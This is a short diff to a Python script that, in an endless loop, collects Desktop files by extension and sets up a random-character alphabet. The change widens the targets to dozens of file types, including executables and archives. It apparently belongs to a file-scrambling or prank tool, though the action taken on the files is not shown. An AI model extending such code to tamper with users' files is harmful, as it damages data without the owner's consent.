@@ -8,9 +8,55 @@ download_path = os.path.join(os.path.expanduser("~"), "Downloads")
 documents_path = os.path.join(os.path.expanduser("~"), "Documents")
 
 
-characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?/~`"
+characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&()_+-=[]{};,.~`"
 while True:
-    extensions = [".txt", ".jpg", ".png", ".pdf", ".docx", ".xlsx", ".pptx", ".mp3", ".mp4", ".avi", ".mkv"]
+    extensions = [
+        ".txt",
+        ".jpg",
+        ".png",
+        ".pdf",
+        ".docx",
+        ".xlsx",
+        ".pptx", 
+        ".mp3", 
+        ".mp4", 
+        ".avi", 
+        ".mkv", 
+        ".zip", 
+        ".rar", 
+        ".7z", 
+        ".tar", 
+        ".gz", 
+        ".html", 
+        ".css", 
+        ".js", 
+        ".json", 
+        ".xml",
+        ".csv",
+        ".exe",
+        ".bat",
+        ".sh",
+        ".iso",
+        ".dll",
+        ".apk",
+        ".dmg",
+        ".psd",
+        ".ai",
+        ".eps",
+        ".indd",
+        ".rtf",
+        ".wav",
+        ".flac",
+        ".ogg",
+        ".mov",
+        ".wmv",
+        ".flv",
+        ".m4v",
+        ".vob",
+        ".ts",
+        ".m2ts",
+        ".webm",
+        ]
     desktop_files =[
         f for f in os.listdir(desktop_path) if os.path.isfile(os.path.join(desktop_path, f)) and any(f.endswith(ext) for ext in extensions)
     ]
